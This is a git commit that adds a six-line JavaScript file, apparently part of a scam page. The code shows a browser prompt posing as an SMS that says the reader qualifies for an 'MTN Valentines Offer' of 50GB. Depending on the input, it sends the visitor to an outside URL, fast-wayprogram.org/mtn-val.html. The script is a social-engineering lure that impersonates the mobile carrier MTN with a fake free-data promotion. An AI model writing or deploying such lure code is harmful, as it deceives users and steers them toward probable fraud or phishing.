22931c4e58c2a236d967b1e096c2f52fbaff63c1
superblog1 <imohette4@gmail.com>
2025-02-04 08:09:40 +0100

    Create mtn-valactive.js

---
+++ mtn-valactive.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify for MTN Valentines Offer, Kindly Press OK to Activate 50GB now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://fast-wayprogram.org/mtn-val.html';
+}
